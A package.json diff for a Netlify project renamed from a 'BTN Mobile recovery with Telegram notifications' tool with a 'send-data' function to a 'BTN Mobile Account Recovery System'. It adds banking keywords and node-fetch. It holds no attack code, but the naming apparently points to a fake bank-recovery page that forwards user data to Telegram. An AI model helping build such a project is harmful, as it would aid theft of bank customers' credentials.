@@ -1,10 +1,21 @@
 {
-  "name": "btn-telegram-notif",
+  "name": "btn-mobile-recovery",
   "version": "1.0.0",
-  "description": "BTN Mobile recovery with Telegram notifications",
-  "main": "netlify/functions/send-data.js",
-  "dependencies": {},
-  "engines": {
-    "node": ">=18.0.0"
-  }
+  "description": "BTN Mobile Account Recovery System",
+  "main": "index.html",
+  "scripts": {
+    "start": "netlify dev",
+    "build": "echo 'Build completed'",
+    "dev": "netlify dev"
+  },
+  "dependencies": {
+    "node-fetch": "^2.7.0"
+  },
+  "devDependencies": {
+    "@netlify/functions": "^2.0.0",
+    "netlify-cli": "^17.0.0"
+  },
+  "keywords": ["btn", "banking", "recovery"],
+  "author": "",
+  "license": "MIT"
 }
